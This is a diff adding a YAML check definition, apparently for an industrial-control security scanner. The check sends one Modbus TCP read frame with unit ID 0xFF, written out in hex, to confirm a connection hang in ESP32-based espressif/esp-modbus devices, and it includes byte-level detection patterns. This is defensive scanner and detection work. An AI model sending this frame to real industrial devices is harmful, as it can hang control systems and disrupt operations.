@@ -1,0 +1,37 @@
+# Ported from a companion fuzzing toolkit:_check_uid_range. Hex verified by
+# running the PoC's own struct.pack helpers (Milestone 3, 2026-08-13), not hand-computed.
+
+check_id: modbus-espmodbus-uid-range
+protocol: modbus
+kind: declarative
+destructive: true
+risk_reason: ["login"]  # plain login attempt, no confirmed lockout risk, no device write (2026-08-29 reclassification)
+disclosure_status: public
+confidence: high
+fingerprint_precondition:
+  vendor: "Espressif Inc."
+  # Same OUI-only-narrows-to-"some-ESP32" caveat as the emelianov checks — see
+  # emelianov-bare-fc.yaml's note and core/fingerprint.py's _OUI_TABLE comment.
+description: "Unit ID 0xFF hangs the connection — espressif/esp-modbus (assessed by vendor as robustness, not a vulnerability; BBP#582, no CVE)"
+detection_hints:
+  transport: tcp
+  app_protocol: modbus
+  mitre_attack_id: T0814
+  analytic_story: "ICS Denial of Service"
+  narrow:
+    description: "This scanner's own exact trigger frame: a well-formed FC03 read request with unit ID 0xFF"
+    patterns:
+      - context: request
+        bytes: "\\x00\\x01\\x00\\x00\\x00\\x06\\xff\\x03\\x00\\x00\\x00\\x01"
+  broad:
+    description: "No safe broader byte signature applies — the trigger is the unit-ID byte at a fixed MBAP header offset being 0xFF, while the preceding transaction-ID bytes vary per request and the following PDU (function code, register address/count) can legitimately differ in a real broader probe. Detecting the general class needs a protocol-aware Modbus TCP parser checking that fixed-offset field, not content/pcre substring matching"
+    patterns: []
+steps:
+  - send_hex: "000100000006ff0300000001"
+    timeout_s: 5.0
+    on_timeout:
+      status: confirmed
+      description: "connection hung after a valid FC03 read with unit ID 0xFF"
+    default:
+      status: not-applicable
+      description: "target responded — not exhibiting the hang"
